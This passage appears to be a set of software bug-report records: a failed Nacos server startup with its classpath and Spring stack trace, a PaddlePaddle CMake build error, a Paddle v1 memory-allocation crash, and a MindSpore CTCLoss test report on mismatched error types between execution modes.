2\repository\io\netty\netty-codec-socks\4.1.48.Final\netty-codec-socks-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-protobuf\1.27.2\grpc-protobuf-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-api\1.27.2\grpc-api-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-context\1.27.2\grpc-context-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\org\codehaus\mojo\animal-sniffer-annotations\1.18\animal-sniffer-annotations-1.18.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-protobuf-lite\1.27.2\grpc-protobuf-lite-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-stub\1.27.2\grpc-stub-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\com\google\api\grpc\proto-google-common-protos\1.17.0\proto-google-common-protos-1.17.0.jar;C:\Users\ZhouYu\.m2\repository\com\google\protobuf\protobuf-java\3.11.4\protobuf-java-3.11.4.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-common\4.1.48.Final\netty-common-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-security\2.2.6.RELEASE\spring-boot-starter-security-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter\2.2.6.RELEASE\spring-boot-starter-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-autoconfigure\2.2.6.RELEASE\spring-boot-autoconfigure-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-logging\2.2.6.RELEASE\spring-boot-starter-logging-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\apache\logging\log4j\log4j-to-slf4j\2.12.1\log4j-to-slf4j-2.12.1.jar;C:\Users\ZhouYu\.m2\repository\org\apache\logging\log4j\log4j-api\2.12.1\log4j-api-2.12.1.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-aop\5.2.5.RELEASE\spring-aop-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-beans\5.2.5.RELEASE\spring-beans-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\security\spring-security-config\5.2.2.RELEASE\spring-security-config-5.2.2.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\security\spring-security-core\5.2.2.RELEASE\spring-security-core-5.2.2.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\security\spring-security-web\5.2.2.RELEASE\spring-security-web-5.2.2.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-expression\5.2.5.RELEASE\spring-expression-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\io\jsonwebtoken\jjwt-api\0.10.5\jjwt-api-0.10.5.jar;C:\Users\ZhouYu\.m2\repository\io\jsonwebtoken\jjwt-impl\0.10.5\jjwt-impl-0.10.5.jar;C:\Users\ZhouYu\.m2\repository\io\jsonwebtoken\jjwt-jackson\0.10.5\jjwt-jackson-0.10.5.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-configuration-processor\2.2.6.RELEASE\spring-boot-configuration-processor-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\com\github\ulisesbocchio\jasypt-spring-boot-starter\2.1.1\jasypt-spring-boot-starter-2.1.1.jar;C:\Users\ZhouYu\.m2\repository\com\github\ulisesbocchio\jasypt-spring-boot\2.1.1\jasypt-spring-boot-2.1.1.jar;C:\Users\ZhouYu\.m2\repository\com\melloware\jasypt\1.9.4\jasypt-1.9.4.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-actuator\2.2.6.RELEASE\spring-boot-starter-actuator-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-actuator-autoconfigure\2.2.6.RELEASE\spring-boot-actuator-autoconfigure-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-actuator\2.2.6.RELEASE\spring-boot-actuator-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.10.3\jackson-datatype-jsr310-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\io\micrometer\micrometer-core\1.3.6\micrometer-core-1.3.6.jar;C:\Users\ZhouYu\.m2\repository\org\hdrhistogram\HdrHistogram\2.1.11\HdrHistogram-2.1.11.jar;C:\Users\ZhouYu\.m2\repository\org\latencyutils\LatencyUtils\2.0.3\LatencyUtils-2.0.3.jar;C:\Users\ZhouYu\.m2\repository\de\codecentric\spring-boot-admin-starter-client\2.2.2\spring-boot-admin-starter-client-2.2.2.jar;C:\Users\ZhouYu\.m2\repository\de\codecentric\spring-boot-admin-client\2.2.2\spring-boot-admin-client-2.2.2.jar;C:\Users\ZhouYu\.m2\repository\org\jolokia\jolokia-core\1.6.2\jolokia-core-1.6.2.jar;C:\Users\ZhouYu\.m2\repository\com\googlecode\json-simple\json-simple\1.1.1\json-simple-1.1.1.jar;C:\Users\ZhouYu\.m2\repository\org\projectlombok\lombok\1.18.12\lombok-1.18.12.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-test\2.2.6.RELEASE\spring-boot-test-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-core\5.2.5.RELEASE\spring-core-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-jcl\5.2.5.RELEASE\spring-jcl-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-test\5.2.5.RELEASE\spring-test-5.2.5.RELEASE.jar"" com.alibaba.nacos.PigxNacosApplication ,--. ,--.'| ,--,: : | Nacos ,`--.'`| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 11912 | : ' '; | / \ / \. ; ,. :| : /`./ Console: http://192.168.62.161:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ `. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | `----. \ | | '`--' / / ,. |' | '.'|\ \ / / /`--' / ' : | ; : .' \ : : `----' '--'. / ; |.' | , .-./\ \ / `--'---' '---' `--`---' `----' 2020-05-18 11:10:47.222 INFO 11912 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration' of type [org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-18 11:10:47.267 INFO 11912 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'objectPostProcessor' of type [org.springframework.security.config.annotation.configuration.AutowireBeanFactoryObjectPostProcessor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-18 11:10:47.270 INFO 11912 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@765d55d5' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-18 11:10:47.272 INFO 11912 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration' of type [org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-18 11:10:47.275 INFO 11912 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-05-18 11:10:47.536 INFO 11912 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2020-05-18 11:10:47.768 INFO 11912 --- [ main] o.s.web.context.ContextLoader : Root WebApplicationContext: initialization completed in 2233 ms 2020-05-18 11:10:48.019 ERROR 11912 --- [ main] o.s.b.web.embedded.tomcat.TomcatStarter : Error starting Tomcat context. Exception: org.springframework.beans.factory.BeanCreationException. Message: Error creating bean with name 'authFilterRegistration' defined in class path resource [com/alibaba/nacos/core/auth/AuthConfigs.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.FilterRegistrationBean]: Factory method 'authFilterRegistration' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authFilter': Unsatisfied dependency expressed through field 'authManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthManager': Unsatisfied dependency expressed through field 'authenticationManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthConfig': Unsatisfied dependency expressed through field 'userDetailsService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosUserDetailsServiceImpl': Unsatisfied dependency expressed through field 'userPersistService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userPersistService': Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [com.alibaba.nacos.config.server.service.PersistService] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2] 2020-05-18 11:10:48.056 WARN 11912 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat 2020-05-18 11:10:55.087 INFO 11912 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos logs files: C:\Users\ZhouYu\nacos\logs\ 2020-05-18 11:10:55.087 INFO 11912 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos conf files: C:\Users\ZhouYu\nacos\conf\ 2020-05-18 11:10:55.087 INFO 11912 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos data files: C:\Users\ZhouYu\nacos\data\ 2020-05-18 11:10:55.088 ERROR 11912 --- [ main] c.l.StartingSpringApplicationRunListener : Nacos failed to start, please see C:\Users\ZhouYu\nacos/logs/nacos.log for more details. 2020-05-18 11:10:55.097 INFO 11912 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-05-18 11:10:55.106 ERROR 11912 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:156) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:544) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.alibaba.nacos.PigxNacosApplication.main(PigxNacosApplication.java:37) Caused by: org.springframework.boot.web.server.WebServerException: Unable to start embedded Tomcat at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:126) at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.&lt;init&gt;(TomcatWebServer.java:88) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.getTomcatWebServer(TomcatServletWebServerFactory.java:438) at org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory.getWebServer(TomcatServletWebServerFactory.java:191) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:180) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:153) ... 8 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'authFilterRegistration' defined in class path resource [com/alibaba/nacos/core/auth/AuthConfigs.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.FilterRegistrationBean]: Factory method 'authFilterRegistration' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authFilter': Unsatisfied dependency expressed through field 'authManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthManager': Unsatisfied dependency expressed through field 'authenticationManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthConfig': Unsatisfied dependency expressed through field 'userDetailsService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosUserDetailsServiceImpl': Unsatisfied dependency expressed through field 'userPersistService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userPersistService': Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [com.alibaba.nacos.config.server.service.PersistService] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2] at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:656) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:484) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1338) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1177) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:557) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:207) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.getOrderedBeansOfType(ServletContextInitializerBeans.java:211) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.getOrderedBeansOfType(ServletContextInitializerBeans.java:202) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addServletContextInitializerBeans(ServletContextInitializerBeans.java:96) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.&lt;init&gt;(ServletContextInitializerBeans.java:85) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.getServletContextInitializerBeans(ServletWebServerApplicationContext.java:253) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.selfInitialize(ServletWebServerApplicationContext.java:227) at org.springframework.boot.web.embedded.tomcat.TomcatStarter.onStartup(TomcatStarter.java:53) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5140) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909) at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:841) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909) at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:262) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardService.startInternal(StandardService.java:421) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:930) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.startup.Tomcat.start(Tomcat.java:468) at org.springframework.boot.web.embedded.tomcat.TomcatWebServer.initialize(TomcatWebServer.java:107) ... 13 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.FilterRegistrationBean]: Factory method 'authFilterRegistration' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authFilter': Unsatisfied dependency expressed through field 'authManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthManager': Unsatisfied dependency expressed through field 'authenticationManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthConfig': Unsatisfied dependency expressed through field 'userDetailsService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosUserDetailsServiceImpl': Unsatisfied dependency expressed through field 'userPersistService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userPersistService': Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [com.alibaba.nacos.config.server.service.PersistService] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2] at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:651) ... 53 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'authFilter': Unsatisfied dependency expressed through field 'authManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthManager': Unsatisfied dependency expressed through field 'authenticationManager'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosAuthConfig': Unsatisfied dependency expressed through field 'userDetailsService'; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'nacosUserDetailsServiceImpl': Unsatisfied dependency expressed through field 'userPersistService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userPersistService': Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [com.alibaba.nacos.config.server.service.PersistService] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:643) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:130) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at "
"CMake Error ""Expression did not evaluate to a known generator expression""","Since PR: https://github.com/PaddlePaddle/Paddle/commit/41e9ecfd1fcfee1bb1f77c5ab29c5d14184110be Paddle stops build at the CMake stage CMake command and few first lines after run: then series of errors occurs such as:   <code>: + cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_GPU=OFF -DWITH_MKLDNN=ON -DWITH_TESTING=ON -DWITH_PROFILER=ON -DWITH_STYLE_CHECK=OFF -DON_INFER=ON -DWITH_INFERENCE_API_TEST=ON -- Found Paddle host system: ubuntu, version: 18.04.4 -- Found Paddle host system's CPU: 192 cores -- The CXX compiler identification is GNU 4.8.5 -- The C compiler identification is GNU 4.8.5 CMake Error at /usr/share/cmake-3.13/Modules/ExternalProject.cmake:1949 (file): Error evaluating generator expression: $&lt;FILTER:,EXCLUDE,/Zc:inline&gt; Expression did not evaluate to a known generator expression Call Stack (most recent call first): /usr/share/cmake-3.13/Modules/ExternalProject.cmake:2111 (_ep_write_log_script) /usr/share/cmake-3.13/Modules/ExternalProject.cmake:2885 (ExternalProject_Add_Step) /usr/share/cmake-3.13/Modules/ExternalProject.cmake:3108 (_ep_add_configure_command) cmake/external/warpctc.cmake:40 (ExternalProject_Add) cmake/third_party.cmake:206 (include) CMakeLists.txt:274 (include) CMake Error at /usr/share/cmake-3.13/Modules/ExternalProject.cmake:1949 (file): Error evaluating generator expression: $&lt;FILTER:,EXCLUDE,/Zc:inline&gt; Expression did not evaluate to a known generator expression Call Stack (most recent call first): /usr/share/cmake-3.13/Modules/ExternalProject.cmake:2111 (_ep_write_log_script) /usr/share/cmake-3.13/Modules/ExternalProject.cmake:2885 (ExternalProject_Add_Step) /usr/share/cmake-3.13/Modules/ExternalProject.cmake:3108 (_ep_add_configure_command) cmake/external/warpctc.cmake:40 (ExternalProject_Add) cmake/third_party.cmake:206 (include) CMakeLists.txt:274 (include)"
size != 0,[出现的问题]:. [场景]： 使用的是paddle v1 跑sequence tagging的模型 [数据格式]： 民 82 NB 族 82 NE 耳 82 NS 早 82 tB 泻 82 tE 外 82 NB 用 82 NE   <code>: ..F0629 14:57:34.098397 14315 MemoryHandle.cpp:52] Check failed: size != 0 allocate 0 bytes *** Check failure stack trace: *** @ 0x13c4c98 google::LogMessage::Fail() @ 0x13c4bf0 google::LogMessage::SendToLog() @ 0x13c4685 google::LogMessage::Flush() @ 0x13c7446 google::LogMessageFatal::~LogMessageFatal() @ 0x806959 paddle::CpuMemoryHandle::CpuMemoryHandle() @ 0x818d3e paddle::CpuVectorT&lt;&gt;::CpuVectorT() @ 0x8198ca paddle::VectorT&lt;&gt;::create() @ 0x6b892e paddle::IndexScanner::finishPrepare() @ 0x6bcf3d paddle::PyDataProvider2::getNextBatchInternal() @ 0x6de429 paddle::DoubleBuffer::asyncLoadBatch() @ 0x7f48226a18a0 execute_native_thread_routine @ 0x7f4822f1f1c3 start_thread @ 0x7f4821e1212d __clone /home/users/hexiaohui/hexiaohui/paddle/paddle_internal_release_tools/idl/paddle/output/bin/paddle_local: line 109: 14172 Aborted (core dumped) ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2}
[CT][MS][ctcloss] 当输入不允许的类型时，Pynative和图模式报错不一致,"1、用例 图模式会报正确报错typeerror, 但pynative没有typeerror，是这种AttributeError，说他没shape 2.不过类似于这种，图模式也校验不到type error了 此时PYNATIVE是这样的 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: def test_ctcloss_input_type_bytearray_error_graphmode(): log_probs = bytearray(10) targets = bytearray(10) input_lengths = bytearray(10) target_lengths = bytearray(10) input_list = [log_probs, targets, input_lengths, target_lengths] net = CTCLossNet(reduction='none') fact = AnyNetFactory(net=net) fact(*input_list) test_ctc_loss.py:200: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:121: in __call__ return self.net(*args) /root/miniconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:945: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:919: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f99d9cfd3d0&gt;, obj = CTCLossNet&lt;&gt; phase = 'train.1670406332497612800.140288068509776.17', do_convert = True, jit_config_dict = {} args = (bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), bytearray(b'\x00\x 00\x00\x00\x00\x00\x00\x00\x00\x00'), bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')) def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E TypeError: The inputs types of the outermost network 'CTCLossNet.construct' support bool, int, float, None, Tensor, Parameter, mst ype.Number(mstype.bool, mstype.int, mstype.float, mstype.uint), and tuple or list containing only these types, and dict whose values are t hese types, but the 1st arg type is &lt;class 'bytearray'&gt;, value is 'bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')'. E For more details, please search 'outermost network' at https://www.mindspore.cn. E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E E # In file /root/miniconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:2388 E if len(log_probs.shape) == 2: E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/pipeline/jit/pipeline.cc:300 CheckArgsValid /root/miniconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/common/api.py:1351: TypeError self = CTCLossNet&lt;&gt;, log_probs = bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') targets = bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), input_lengths = bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') target_lengths = bytearray(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') def construct(self, log_probs, targets, input_lengths, target_lengths): &gt; if len(log_probs.shape) == 2: E AttributeError: 'bytearray' object has no attribute 'shape' /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:2318: AttributeError def test_ctcloss_input_type_list_error(): log_probs = [-5, -3, -1, 1, 3, 5] targets = [-5, -3, -1, 1, 3, 5] input_lengths = [-5, -3, -1, 1, 3, 5] target_lengths = [-5, -3, -1, 1, 3, 5] input_list = [log_probs, targets, input_lengths, target_lengths] net = CTCLossNet(reduction='none') fact = AnyNetFactory(net=net) #with pytest.raises(AttributeError): &gt; fact(*input_list) test_ctc_loss.py:138: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:121: in __call__ return self.net(*args) /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:626: in __call__ out = self.compile_and_run(*args) /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:945: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/cell.py:919: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff958b91d0&gt;, obj = CTCLossNet&lt;&gt; phase = 'train.1670346675571283456.281469951482960.9', do_convert = True, jit_config_dict = {} args = ([-5, -3, -1, 1, 3, 5], [-5, -3, -1, 1, 3, 5], [-5, -3, -1, 1, 3, 5], [-5, -3, -1, 1, 3, 5]) def compile(self, 